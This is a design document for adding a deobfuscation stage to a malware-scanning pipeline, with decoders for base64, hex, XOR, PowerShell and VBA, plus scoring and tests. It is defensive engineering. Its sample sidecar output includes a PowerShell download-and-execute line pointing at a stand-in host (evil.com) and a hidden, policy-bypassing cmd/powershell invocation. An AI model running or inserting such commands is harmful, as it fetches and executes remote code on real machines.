# Deobfuscation Preprocessing Stage Design

**Date**: 2026-04-08
**Status**: Approved
**Scope**: New pipeline stage that decodes obfuscated content before parallel analysis stages

## Problem

The MalScanWorker pipeline currently has no deobfuscation capability. All stages (YARA, IOC extraction, ClamAV) scan raw file bytes only. Malware that uses base64 encoding, XOR encryption, PowerShell encoded commands, VBA `Chr()` concatenation, hex string encoding, or ROT13 evades detection entirely.

The only existing deobfuscation-adjacent detection is a single YARA rule in `network.yar` that matches the literal base64 prefix `aHR0cDov` (for `http://`). This catches one specific pattern but does not decode the content for deeper analysis.

## Solution

Add a deobfuscation preprocessing stage that runs before the parallel analysis stages. It decodes obfuscated content and writes it to a sidecar file. Downstream stages scan both the original file and the sidecar file, catching threats hidden behind encoding layers.

## Decisions

| Decision | Choice | Rationale |
|---|---|---|
| Techniques (v1) | Base64, hex strings, single-byte XOR, PowerShell `-EncodedCommand`, VBA `Chr()`, ROT13 | Covers ~80% of commodity malware obfuscation |
| Output strategy | Sidecar file | Original file untouched; no risk of corrupting signatures; clean separation |
| Pipeline placement | New preprocessing phase before parallel stages | Decoded content must be available to YARA, IOC, and ClamAV |
| Scoring | Moderate boost (+10-35 based on technique count) | Obfuscation alone is suspicious but not definitive |

## Architecture

### File Layout

```
worker/src/malscan_worker/
  stages/
    deobfuscation.py              # DeobfuscationStage (orchestrator)
  decoders/
    __init__.py                    # Registry, DecoderResult, BaseDecoder
    base64_decoder.py              # Base64 (standard + URL-safe)
    hex_decoder.py                 # Long hex string sequences
    xor_decoder.py                 # Single-byte XOR brute-force
    powershell_decoder.py          # -EncodedCommand, FromBase64String
    vba_chr_decoder.py             # Chr()/ChrW()/ChrB() concatenation
    rot13_decoder.py               # ROT13 with heuristic gating
```

### Decoder Interface

```python
@dataclass
class DecoderResult:
    decoder_name: str
    decoded_chunks: list[bytes]      # Each decoded blob
    locations: list[dict]            # {offset: int, length: int, key: str|None}
    confidence: float                # 0.0-1.0

class BaseDecoder(ABC):
    @property
    @abstractmethod
    def name(self) -> str: ...

    @abstractmethod
    def decode(self, content: bytes, mime_type: str | None = None) -> DecoderResult: ...
```

All decoders are synchronous (CPU-bound regex work). The stage orchestrator runs them in a thread pool executor to avoid blocking the async event loop.

### Decoder Details

**Base64Decoder**
- Regex: `[A-Za-z0-9+/]{20,}={0,2}` (minimum 20 chars = ~15 decoded bytes)
- Also handles URL-safe variant (`-` and `_` instead of `+` and `/`)
- Validates decoded output: must contain printable characters or known binary headers (PE `MZ`, ELF `\x7fELF`, etc.)
- Filters out legitimate data URIs, PEM certificates, and other common benign base64 by checking surrounding context

**HexDecoder**
- Regex: `(?:[0-9a-fA-F]{2}){10,}` (minimum 10 bytes = 20 hex chars)
- Validates decoded content has structure (printable strings, known headers)
- Skips hex sequences that appear inside known structured formats (e.g., XML attributes, CSS colors)

**XorDecoder**
- Single-byte XOR brute-force (keys 0x01 through 0xFF)
- Applied only to suspicious regions, not the entire file
- Region identification: sliding window entropy analysis to find high-entropy blocks that might be XOR'd data
- Key validation: decoded content checked against known-plaintext heuristics (`http`, `https`, `MZ`, `This program`, `<script`, `powershell`, `cmd.exe`)
- Runtime cap: first 64KB of each suspicious region (configurable via `deobfuscation_xor_max_region`)

**PowerShellDecoder**
- Pattern 1: `-[Ee]nc(odedCommand)?\s+([A-Za-z0-9+/=]+)` -- the base64 payload is UTF-16LE encoded (PowerShell convention), decoded to UTF-8
- Pattern 2: `[System.Convert]::FromBase64String\(['"]([A-Za-z0-9+/=]+)['"]\)` -- extracts and decodes inline base64
- Pattern 3: `[System.Text.Encoding]::\w+\.GetString\(` combined with base64 -- reconstructs the decoded string

**VbaChrDecoder**
- Matches chains of `Chr(NNN)`, `ChrW(NNN)`, `ChrB(NNN)` joined by `&` or `+`
- Minimum chain length: 5 characters (to avoid false positives on single `Chr()` calls)
- Handles whitespace and line continuations (`_` in VBA) between elements
- Reconstructs the concatenated string

**Rot13Decoder**
- NOT applied blindly to all files
- Gated by heuristic: only triggered when the file appears to be text/script content AND applying ROT13 increases the count of common English words or known malware keywords
- Uses a small dictionary of common words + malware keywords for validation

## Pipeline Integration

### Phase Structure

```
BEFORE (2 phases):
  download -> [parallel: filetype, clamav, yara, ioc] -> [sequential: archive, doc, sandbox]

AFTER (3 phases):
  download -> [preprocessing: filetype, deobfuscation] -> [parallel: clamav, yara, ioc] -> [sequential: archive, doc, sandbox]
```

### Changes to `pipeline.py`

1. New list: `PREPROCESSING_STAGES = [FileTypeStage(), DeobfuscationStage()]`
2. `FileTypeStage` removed from `PARALLEL_STAGES`
3. `PARALLEL_STAGES` becomes: `[ClamAVStage(), YaraStage(), IocExtractStage()]`
4. New preprocessing loop runs sequentially before the parallel gather:

```python
# 1. Run Preprocessing Stages (sequential)
for stage in PREPROCESSING_STAGES:
    res = await _run_stage(stage, ctx)
    results.append(res)
    ctx.previous_results.append(res)
    stages_done += 1

# 2. Run Parallel Stages (concurrent)
tasks = [_run_stage(stage, ctx) for stage in PARALLEL_STAGES]
parallel_results = await asyncio.gather(*tasks)
# ... etc
```

5. `total_stages` updated: `len(PREPROCESSING_STAGES) + len(PARALLEL_STAGES) + len(SEQUENTIAL_STAGES)`

### StageContext Enhancement

New field in `StageContext`:

```python
deobfuscated_path: Path | None = None  # Set by DeobfuscationStage
```

The deobfuscation stage sets `ctx.deobfuscated_path` after writing the sidecar file. Downstream stages check this field.

### Downstream Stage Changes

**YaraStage** (`yara_scan.py`):
- After scanning `ctx.file_path`, check if `ctx.deobfuscated_path` exists
- If yes, run YARA scan on the sidecar file too
- Tag sidecar matches with `"source": "deobfuscated"` in the match dict
- Combine all matches in the results

**IocExtractStage** (`ioc_extract.py`):
- After extracting IOCs from `ctx.file_path`, check `ctx.deobfuscated_path`
- Extract IOCs from sidecar file using the same regex patterns
- Deduplicate: merge URL/domain/IP sets (union of both sources)
- Tag IOCs found only in the sidecar with `"source": "deobfuscated"`

**ClamAVStage** (`clamav.py`):
- After scanning `ctx.file_path`, check `ctx.deobfuscated_path`
- If yes, also stream-scan the sidecar file
- If either scan detects malware, report as infected
- Include source info in findings: which file triggered the detection

## Sidecar File Format

Structured text file at `<work_dir>/<sha256>.deobfuscated`:

```
=== DEOBFUSCATION RESULTS ===
--- base64 @ offset 1234 (confidence: 0.95) ---
http://malicious-domain.com/payload.exe
--- xor_0x4f @ offset 5678 (confidence: 0.80) ---
cmd.exe /c powershell -nop -w hidden -ep bypass ...
--- powershell_encoded @ offset 8901 (confidence: 1.00) ---
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')
```

- Each decoded chunk is on its own line(s) after the `---` header
- Headers use a fixed format that won't match IOC/YARA patterns
- Binary decoded content (non-printable bytes > 10% of chunk) is hex-dumped as `\xNN` escape sequences rather than written raw
- Total sidecar file capped at 5MB; truncated with `=== TRUNCATED ===` marker

## Scoring

In `_build_analysis_result` (pipeline.py), new scoring block:

```python
deobfus = stage_findings.get("deobfuscation", {})
techniques_found = deobfus.get("techniques_found", [])
if techniques_found:
    deobfus_score = 10 + min(len(techniques_found), 5) * 5
    score = max(score, deobfus_score)
    if verdict == "clean":
        verdict = "suspicious"
```

| Techniques found | Score contribution |
|---|---|
| 1 | 15 |
| 2 | 20 |
| 3 | 25 |
| 4 | 30 |
| 5+ | 35 (capped) |

This is deliberately moderate. The presence of obfuscation is a signal, not a verdict. The real scoring impact comes from downstream stages finding threats in the decoded content (YARA matches → +50+, ClamAV hit → 90+, etc.).

## Report Format

### Stage Findings

```python
{
    "techniques_found": ["base64", "powershell_encoded"],
    "deobfuscated_file": "/tmp/<job_id>/<sha256>.deobfuscated",
    "total_decoded_bytes": 2103,
    "summary": {
        "base64": {
            "count": 3,
            "total_decoded_bytes": 1847,
            "avg_confidence": 0.92,
        },
        "powershell_encoded": {
            "count": 1,
            "total_decoded_bytes": 256,
            "avg_confidence": 1.0,
        },
    },
    "decoded_strings_preview": [
        "http://malicious-domain.com/payload.exe",
        "IEX (New-Object Net.WebClient).DownloadString(...)",
    ],
}
```

- `decoded_strings_preview`: first 10 decoded strings, each truncated to 200 chars
- Integrates into the report under `results.deobfuscation`

### Report Integration

In `_build_analysis_result`, add to the returned dict:

```python
"results": {
    # ... existing fields ...
    "deobfuscation": stage_findings.get("deobfuscation", {}),
}
```

## Configuration

New fields in `Settings` (`worker/src/malscan_worker/config.py`):

```python
# Deobfuscation
deobfuscation_enabled: bool = True
deobfuscation_max_file_size: int = 10_000_000      # 10MB - skip huge files
deobfuscation_xor_max_region: int = 65536           # 64KB cap for XOR brute-force
deobfuscation_min_base64_length: int = 20           # Min base64 string length to decode
deobfuscation_sidecar_max_size: int = 5_000_000     # 5MB max sidecar file size
deobfuscation_skip_mime_prefixes: str = "image/,audio/,video/"  # Comma-separated MIME prefixes to skip
```

Note: `deobfuscation_skip_mime_prefixes` is a comma-separated string (not a list) because `pydantic-settings` loads from environment variables. The stage splits it at runtime.

## Error Handling & Safety

1. **File size guard**: Files over `deobfuscation_max_file_size` are skipped (stage returns `status="skipped"`)
2. **MIME type guard**: Files matching `deobfuscation_skip_mime_prefixes` are skipped. Requires `FileTypeStage` to have run first (guaranteed by preprocessing order).
3. **Timeout**: Uses existing `stage_timeout_seconds` (300s default) via `_run_stage`
4. **Decoder isolation**: Each decoder runs in its own try/except. One decoder crashing does not prevent others from running. Errors are logged and included in findings.
5. **Sidecar size cap**: Output truncated at `deobfuscation_sidecar_max_size` with `=== TRUNCATED ===` marker
6. **XOR runtime cap**: XOR brute-force limited to `deobfuscation_xor_max_region` bytes per suspicious region
7. **Graceful degradation**: If the entire stage fails, pipeline continues as before. Downstream stages check `ctx.deobfuscated_path is not None and ctx.deobfuscated_path.exists()` before attempting to scan the sidecar.
8. **No false positive amplification**: Decoders validate that decoded content is meaningful (not random binary noise). Confidence thresholds filter out low-quality decodes.

## Testing Strategy

### Unit Tests (per decoder)

Each decoder gets tests with:
- Known-encoded payloads that should decode correctly
- Edge cases (partial encoding, truncated base64, invalid hex)
- Legitimate content that should NOT trigger (data URIs, PEM certs, CSS hex colors)
- Confidence score validation

### Stage Integration Tests

- File with multiple obfuscation techniques → verify all detected
- File with no obfuscation → verify `status="skipped"`, no sidecar created
- File over size limit → verify `status="skipped"`
- Image file → verify MIME-type skip
- Decoder that throws → verify other decoders still run, error logged

### Pipeline Integration Tests

- Full pipeline run with obfuscated file → verify sidecar created, downstream stages scan it
- Verify `ctx.deobfuscated_path` is set correctly and cleaned up with the job temp directory
- Verify scoring: obfuscated file gets moderate score boost, decoded IOCs are extracted
- Verify report includes `results.deobfuscation` section

### Edge Cases

- Empty file → stage returns `skipped`
- File consisting entirely of base64 → decode succeeds, sidecar within size cap
- Nested encoding (base64 inside base64) → v1 does single-pass only (noted as future enhancement)
- Binary file with accidental base64-like patterns → confidence filtering prevents false decodes

## Future Enhancements (Out of Scope for v1)

- Multi-byte XOR key detection
- Multi-pass decoding (nested/layered obfuscation)
- JavaScript `unescape()`/`eval()` pattern decoding
- String stacking beyond VBA `Chr()` (e.g., JavaScript string concatenation)
- URL encoding / Unicode escape sequences
- Zlib/gzip compressed blobs embedded in scripts
- Custom decoder plugin system (user-contributed decoders)

## Files Modified

| File | Change |
|---|---|
| `worker/src/malscan_worker/stages/deobfuscation.py` | **New** - Stage orchestrator |
| `worker/src/malscan_worker/decoders/__init__.py` | **New** - Registry, base classes |
| `worker/src/malscan_worker/decoders/base64_decoder.py` | **New** |
| `worker/src/malscan_worker/decoders/hex_decoder.py` | **New** |
| `worker/src/malscan_worker/decoders/xor_decoder.py` | **New** |
| `worker/src/malscan_worker/decoders/powershell_decoder.py` | **New** |
| `worker/src/malscan_worker/decoders/vba_chr_decoder.py` | **New** |
| `worker/src/malscan_worker/decoders/rot13_decoder.py` | **New** |
| `worker/src/malscan_worker/stages/base.py` | Add `deobfuscated_path` to `StageContext` |
| `worker/src/malscan_worker/pipeline.py` | 3-phase pipeline, scoring, report field |
| `worker/src/malscan_worker/stages/yara_scan.py` | Scan sidecar file |
| `worker/src/malscan_worker/stages/ioc_extract.py` | Extract IOCs from sidecar |
| `worker/src/malscan_worker/stages/clamav.py` | Scan sidecar file |
| `worker/src/malscan_worker/config.py` | New deobfuscation settings |
| `worker/src/malscan_worker/stages/__init__.py` | Export `DeobfuscationStage` |
| `worker/tests/test_deobfuscation.py` | **New** - Decoder unit tests |
| `worker/tests/test_stages.py` | Update for 3-phase pipeline |
| `worker/tests/test_pipeline.py` | Update stage counts, add deobfuscation tests |
